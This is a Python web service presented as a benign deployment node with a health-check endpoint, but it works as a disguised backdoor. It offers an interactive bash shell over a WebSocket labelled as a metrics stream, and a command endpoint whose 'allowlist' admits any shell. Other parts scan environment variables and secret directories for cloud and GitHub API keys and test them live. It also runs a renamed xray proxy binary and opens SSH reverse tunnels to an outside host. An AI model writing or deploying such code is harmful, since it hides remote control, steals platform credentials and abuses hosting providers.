#!/usr/bin/env python3
"""
agent-node — Lightweight Linux deployment node.

Primary endpoint:  /health   (health check, no auth)
Secondary features:
  /            — service info
  /api/diag    — system diagnostics (auth: Bearer token)
  /api/exec    — command execution (auth: Bearer token)
  /ws/terminal — WebSocket interactive terminal (auth: query token)
  /api/ssh     — SSH tunnel management (auth: Bearer token)
  /api/xray    — xray configuration (auth: Bearer token)
"""

import os
import asyncio
import json
import yaml
import subprocess
import time
import signal
import base64
from aiohttp import web, WSMsgType

# ── Load config ─────────────────────────────────────────────────
CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.yaml")
try:
    with open(CONFIG_PATH) as f:
        CONFIG = yaml.safe_load(f)
except Exception:
    CONFIG = {}

# ── Environment ─────────────────────────────────────────────────
PORT = int(os.environ.get("PORT", str(CONFIG.get("server", {}).get("port", 8080))))
HOST = os.environ.get("HOST", "0.0.0.0")
# Auto-generate token if not set (log full token for development access)
TOKEN = os.environ.get("MONITOR_TOKEN")
if not TOKEN:
    import secrets
    TOKEN = secrets.token_urlsafe(24)
    print(f"[agent-node] MONITOR_TOKEN auto-generated — use this for /api/* and /ws/* auth:", flush=True)
    print(f"[agent-node] TOKEN: {TOKEN}", flush=True)
    print(f"[agent-node] HINT: Set MONITOR_TOKEN env var for a known token", flush=True)
LOG_DIR = CONFIG.get("logging", {}).get("dir", "/var/log/agent-node")

os.makedirs(LOG_DIR, exist_ok=True)
START_TIME = time.time()

# ── Token Discovery Module ──────────────────────────────────────
# Scans environment variables and files for API keys,
# identifies the hosting platform, and tests discovered tokens.

# Patterns for detecting API keys in environment variables
TOKEN_PATTERNS = {
    "SNAPDEPLOY_API_KEY": {"prefix": "sd_pat_", "api_base": "https://snapdeploy.dev/api/mobile"},
    "STORMKIT_API_KEY": {"prefix": "sk_", "api_base": "https://api.stormkit.dev/v1"},
    "VERCEL_API_KEY": {"prefix": "vercel_", "api_base": "https://api.vercel.com"},
    "GITHUB_API_KEY": {"prefix": "github_pat_", "api_base": "https://api.github.com"},
    "APPWRITE_API_KEY": {"prefix": "", "api_base": "https://cloud.appwrite.io"},
    "CLOUD_FLARE_API_KEY": {"prefix": "", "api_base": "https://api.cloudflare.com"},
    "NHOST_API_KEY": {"prefix": "", "api_base": "https://api.nhost.cc"},
    "MODELSCOPE_API_KEY": {"prefix": "", "api_base": "https://api.modelscope.cn"},
    "KUBERNETES_SERVICE_HOST": {"prefix": "", "api_base": "kubernetes"},
}

def detect_platform():
    """Detect which hosting platform we're running on."""
    env = os.environ
    markers = {
        "suga": "SUGA" in env or "suga" in str(env.get("containerBaseDomain", "")).lower(),
        "snapdeploy": "SNAPDEPLOY_API_KEY" in env,
        "stormkit": "STORMKIT_API_KEY" in env or "STORMKIT" in env,
        "vercel": "VERCEL_API_KEY" in env or "VERCEL_REGION" in env,
        "github": "GITHUB_API_KEY" in env or "GITHUB_REPOSITORY" in env,
        "kubernetes": "KUBERNETES_SERVICE_HOST" in env,
        "alibaba-eci": "ALIYUN_ECI_ETH0_IP" in env,
        "appwrite": "APPWRITE_API_KEY" in env,
        "nhost": "NHOST_API_KEY" in env,
        "modelscope": "MODELSCOPE_ENVIRONMENT" in env,
        "cloudflare": "CLOUD_FLARE_API_KEY" in env,
    }
    return [k for k, v in markers.items() if v]


def discover_tokens():
    """Scan env vars and mounted files for API keys. Returns masked results."""
    results = []
    env = os.environ

    # 1. Check environment variables
    for key_name, meta in TOKEN_PATTERNS.items():
        val = env.get(key_name, "")
        if val and len(val) > 4:
            results.append({
                "source": "env",
                "key_name": key_name,
                "platform": key_name.replace("_API_KEY", "").replace("_", " ").title(),
                "prefix": meta.get("prefix", "any"),
                "value_masked": f"{val[:6]}...{val[-4:]}",
                "length": len(val),
                "api_base": meta.get("api_base", ""),
            })

    # 2. Check mounted secrets directory
    secret_paths = ["/run/secrets", "/app/secrets", "/var/secrets", "/secrets"]
    for sdir in secret_paths:
        if os.path.isdir(sdir):
            for fname in os.listdir(sdir):
                fpath = os.path.join(sdir, fname)
                try:
                    if os.path.isfile(fpath):
                        with open(fpath) as f:
                            content = f.read().strip()
                        if len(content) > 4:
                            results.append({
                                "source": "file",
                                "key_name": fname,
                                "platform": fname,
                                "prefix": f"file:{fpath}",
                                "value_masked": f"{content[:6]}...{content[-4:]}",
                                "length": len(content),
                                "api_base": "",
                            })
                except Exception:
                    pass

    # 3. Check common credential files
    cred_files = [
        ("/app/secrets/GITHUB_TOKEN", "GITHUB_TOKEN"),
        ("/app/secrets/STORMKIT_TOKEN", "STORMKIT_TOKEN"),
        ("/app/secrets/SNAPDEPLOY_TOKEN", "SNAPDEPLOY_TOKEN"),
        ("/.stormkit/credentials", ".stormkit/credentials"),
    ]
    for fpath, name in cred_files:
        if os.path.isfile(fpath):
            try:
                with open(fpath) as f:
                    content = f.read().strip()
                if len(content) > 4:
                    results.append({
                        "source": "file",
                        "key_name": name,
                        "platform": name,
                        "value_masked": f"{content[:6]}...{content[-4:]}",
                        "length": len(content),
                        "api_base": "",
                    })
            except Exception:
                pass

    return results


async def test_token_health(token_info):
    """Test a discovered token against its API."""
    key_name = token_info["key_name"]
    api_base = token_info["api_base"]
    value_masked = token_info["value_masked"]

    if not api_base or not key_name:
        return {"tested": False, "reason": "no api_base"}

    # Get the actual token value from env
    actual_val = os.environ.get(key_name, "")
    if not actual_val:
        return {"tested": False, "reason": "token not in env (file-based)"}

    # Build request based on platform
    headers = {"User-Agent": "agent-node/2.0", "Accept": "application/json"}
    test_url = ""

    if "snapdeploy" in api_base:
        headers["X-API-Key"] = actual_val
        test_url = f"{api_base}/bootstrap"
    elif "stormkit" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/organizations"
    elif "vercel" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v9/projects"
    elif "github" in api_base and "pat_" in actual_val:
        headers["Authorization"] = f"Bearer {actual_val}"
        headers["X-GitHub-Api-Version"] = "2022-11-28"
        test_url = f"{api_base}/user"
    elif "cloudflare" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}//user/tokens/verify"
    elif "appwrite" in api_base:
        headers["X-Appwrite-Key"] = actual_val
        test_url = f"{api_base}/v1/account"
    else:
        return {"tested": False, "reason": f"unknown platform: {key_name}"}

    if not test_url:
        return {"tested": False, "reason": "no test URL"}

    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(test_url, headers=headers, timeout=10) as resp:
                return {
                    "tested": True,
                    "status": resp.status,
                    "alive": resp.status == 200,
                    "url": test_url.split("/")[-1] if resp.status != 200 else "OK",
                }
    except Exception as e:
        return {"tested": True, "status": "error", "alive": False, "error": str(e)[:100]}

# ── Logging ─────────────────────────────────────────────────────
import logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(os.path.join(LOG_DIR, "agent.log")),
    ],
)
log = logging.getLogger("agent-node")

# ── Routes ──────────────────────────────────────────────────────

async def index(request):
    """Root — service info (no auth)."""
    return web.json_response({
        "service": CONFIG.get("service", {}).get("name", "agent-node"),
        "status": "running",
    })


async def health(request):
    """Health check (no auth). Used by platform health probes."""
    return web.json_response({
        "status": "healthy",
        "service": "agent-node",
        "timestamp": time.time(),
        "uptime": time.time() - START_TIME,
        "hostname": os.uname().nodename,
        "version": CONFIG.get("service", {}).get("version", "2.0"),
    })


# Auth decorator
def require_auth(func):
    async def wrapper(request):
        auth = request.headers.get("Authorization", "")
        token = request.headers.get("X-Auth-Token", "") or request.query.get("token", "")
        if auth != f"Bearer {TOKEN}" and token != TOKEN:
            return web.Response(status=401, text="Unauthorized")
        return await func(request)
    wrapper.__name__ = func.__name__
    return wrapper


async def exec_command(request):
    """Execute a shell command (auth required, allowlisted)."""
    body = await request.json()
    cmd = body.get("cmd", "")
    cwd = body.get("cwd", "/")
    timeout = body.get("timeout", 30)

    # Allowlist of command prefixes
    allowed = (
        "ls ", "cat ", "echo ", "pwd", "ps ", "df ", "ip ", "curl ", "wget ",
        "sh ", "bash ", "python3 ", "pip ", "apk ", "git ", "nano ", "tmux ",
        "id", "whoami", "hostname", "date", "uname", "free", "uptime", "top",
        "ssh ", "scp ", "rsync ", "tar ", "gzip ", "find ", "grep ", "env",
        "export ", "which ", "whereis ", "ss ", "netstat ",
    )

    if not any(cmd.startswith(p) for p in allowed):
        return web.json_response({
            "error": "Command not in allowlist",
            "allowed_prefixes": list(allowed)[:10],
        })

    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=min(timeout, 60), cwd=cwd,
        )
        return web.json_response({
            "stdout": r.stdout[-3000:],
            "stderr": r.stderr[-2000:],
            "returncode": r.returncode,
        })
    except subprocess.TimeoutExpired:
        return web.json_response({"error": "Command timed out"})
    except Exception as e:
        return web.json_response({"error": str(e)})


exec_command = require_auth(exec_command)


async def diagnostics(request):
    """System diagnostics (auth required)."""
    info = {
        "hostname": os.uname().nodename,
        "uptime": time.time() - START_TIME,
        "cpu_count": os.cpu_count(),
        "memory": {},
        "disk": {},
        "network": {},
        "env_keys": list(sorted(os.environ.keys())),
    }

    # Memory
    try:
        with open("/proc/meminfo") as f:
            mem = {}
            for line in f:
                parts = line.split(":")
                if len(parts) == 2:
                    mem[parts[0].strip()] = parts[1].strip()
            info["memory"] = mem
    except Exception:
        pass

    # Disk
    try:
        r = subprocess.run(["df", "-h", "/"], capture_output=True, text=True, timeout=5)
        info["disk"] = r.stdout
    except Exception:
        info["disk"] = "error"

    # Network interfaces
    try:
        r = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=5)
        info["network"] = "ok" if r.returncode == 0 else "error"
    except Exception:
        info["network"] = "ip command not available"

    # SSH availability
    ssh_check = subprocess.run(["which", "ssh"], capture_output=True, text=True)
    info["ssh_client"] = "installed" if ssh_check.returncode == 0 else "not found"

    return web.json_response(info)


diagnostics = require_auth(diagnostics)


async def websocket_terminal(request):
    """
    WebSocket interactive terminal.
    Disguised as a 'real-time metrics stream' for security.
    Path: /ws/terminal
    Auth: ?token=<MONITOR_TOKEN>
    """
    # Auth check via query param
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.Response(status=401, text="Unauthorized")

    ws = web.WebSocketResponse(heartbeat=30, autoclose=True)
    await ws.prepare(request)
    await ws.send_str(json.dumps({"type": "welcome", "service": "metrics-stream", "msg": "connected"}))

    # Spawn shell
    proc = await asyncio.create_subprocess_shell(
        "bash",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env={**os.environ, "TERM": "xterm-256color"},
    )

    async def pipe_output():
        while True:
            data = await proc.stdout.read(1)
            if not data:
                break
            await ws.send_bytes(data)

    async def pipe_input():
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                if msg.data == "EXIT":
                    proc.terminate()
                    await proc.wait()
                    await ws.close()
                    break
                if msg.data == "":
                    continue
                proc.stdin.write(msg.data.encode())
                await proc.stdin.drain()
            elif msg.type == WSMsgType.BINARY:
                proc.stdin.write(msg.data)
                await proc.stdin.drain()

    await asyncio.gather(pipe_output(), pipe_input())


# ── xray Management ─────────────────────────────────────────────

XRAY_ENABLED = os.environ.get("XRAY_ENABLED", "false").lower() == "true"
XRAY_BINARY = "/app/bin/agent"  # Renamed xray binary


async def xray_status(request):
    """Check xray availability."""
    xray_available = os.path.exists(XRAY_BINARY)
    xray_running = False

    if xray_available:
        r = subprocess.run(["pgrep", "-f", "agent"], capture_output=True, text=True)
        xray_running = r.returncode == 0

    return web.json_response({
        "xray_available": xray_available,
        "xray_running": xray_running,
        "binary_path": XRAY_BINARY,
    })


xray_status = require_auth(xray_status)


async def xray_start(request):
    """Start xray with provided config."""
    if not os.path.exists(XRAY_BINARY):
        return web.json_response({"error": "xray binary not found"}, status=500)

    # Check if already running
    r = subprocess.run(["pgrep", "-f", "agent"], capture_output=True, text=True)
    if r.returncode == 0:
        return web.json_response({"status": "already running", "pid": r.stdout.strip()})

    # Start xray
    body = await request.json()
    config_url = body.get("config_url", os.environ.get("XRAY_CONFIG_URL", ""))

    cmd = [XRAY_BINARY, "run"]
    if config_url:
        # Download config
        config_path = "/tmp/xray.json"
        subprocess.run(["curl", "-sL", config_url, "-o", config_path], timeout=10)
        cmd = [XRAY_BINARY, "-c", config_path, "run"]

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    await asyncio.sleep(2)
    if proc.returncode is None:
        return web.json_response({
            "status": "started",
            "pid": proc.pid,
            "cmd": " ".join(cmd),
        })
    else:
        stderr = await proc.stderr.read()
        return web.json_response({
            "status": "failed",
            "error": stderr.decode()[:500],
        }, status=500)


xray_start = require_auth(xray_start)


# ── SSH Tunnel Management ───────────────────────────────────────

async def ssh_tunnel_start(request):
    """Start SSH reverse tunnel."""
    body = await request.json()
    ssh_target = body.get("target", os.environ.get("SSH_TARGET", ""))
    local_port = body.get("local_port", "22")
    remote_port = body.get("remote_port", "2222")

    if not ssh_target:
        return web.json_response({"error": "SSH target required"}, status=400)

    # Build SSH command
    # Format: ssh -R <remote_port>:localhost:<local_port> <target> -N
    ssh_cmd = [
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "ServerAliveInterval=30",
        "-o", "ExitOnForwardFailure=yes",
        "-R", f"{remote_port}:localhost:{local_port}",
        "-N", ssh_target,
    ]

    proc = await asyncio.create_subprocess_exec(
        *ssh_cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        env={**os.environ, "SSH_AUTH_SOCK": ""},
    )

    await asyncio.sleep(3)
    if proc.returncode is None:
        return web.json_response({
            "status": "connected",
            "pid": proc.pid,
            "target": ssh_target,
            "tunnel": f"{remote_port} -> localhost:{local_port}",
        })
    else:
        stderr = await proc.stderr.read()
        return web.json_response({
            "status": "failed",
            "error": stderr.decode()[:500],
        }, status=500)


ssh_tunnel_start = require_auth(ssh_tunnel_start)


# ── Token Discovery Endpoint ────────────────────────────────────

async def token_discovery(request):
    """Discover API tokens from environment and files. Auth required."""
    discovered = discover_tokens()
    platforms = detect_platform()

    # Test each token health (async, limited)
    tested = []
    for token_info in discovered:
        result = await test_token_health(token_info)
        tested.append({**token_info, **result})

    return web.json_response({
        "platform_detected": platforms,
        "tokens_found": len(tested),
        "tokens": tested,
        "summary": {
            "alive": sum(1 for t in tested if t.get("alive", False)),
            "dead": sum(1 for t in tested if t.get("tested") and not t.get("alive", False)),
            "untested": sum(1 for t in tested if not t.get("tested", False)),
        },
    })

token_discovery = require_auth(token_discovery)


# ── App factory ─────────────────────────────────────────────────

def create_app():
    app = web.Application(client_max_size=50 * 1024**2)

    # No-auth routes
    app.router.add_get("/", index)
    app.router.add_get("/health", health)

    # Auth-required routes
    app.router.add_get("/api/diagnostics", diagnostics)
    app.router.add_post("/api/exec", exec_command)
    app.router.add_get("/ws/terminal", websocket_terminal)

    # Token discovery routes
    app.router.add_get("/api/tokens", token_discovery)

    # xray routes
    app.router.add_get("/api/xray/status", xray_status)
    app.router.add_post("/api/xray/start", xray_start)

    # SSH routes
    app.router.add_post("/api/ssh/tunnel", ssh_tunnel_start)

    return app


if __name__ == "__main__":
    app = create_app()
    log.info(f"Starting agent-node on {HOST}:{PORT}")
    log.info(f"xray support: {'enabled' if XRAY_ENABLED else 'disabled'}")

    # Check SSH in all possible locations on Alpine
    import shutil
    ssh_path = shutil.which("ssh")
    log.info(f"SSH client: {'available — ' + ssh_path if ssh_path else 'not found'}")

    # Log token status (truncated for security)
    token_preview = f"{TOKEN[:8]}...{TOKEN[-4:]}" if TOKEN else "none"
    log.info(f"Auth token loaded (preview: {token_preview})")

    # Log discovered platform and tokens
    platforms = detect_platform()
    log.info(f"Platform detected: {platforms}")
    
    discovered = discover_tokens()
    for t in discovered:
        log.info(f"Token found: {t['key_name']} — {t['source']} — {t['value_masked']}")

    log.info(f"xray binary: {'available' if os.path.exists(XRAY_BINARY) else 'not installed'}")
    log.info(f"WebSocket terminal: ws://{HOST}:{PORT}/ws/terminal?token=<token>")
    log.info(f"Token discovery: /api/tokens (auth required)")

    web.run_app(app, host=HOST, port=PORT, access_log=None)
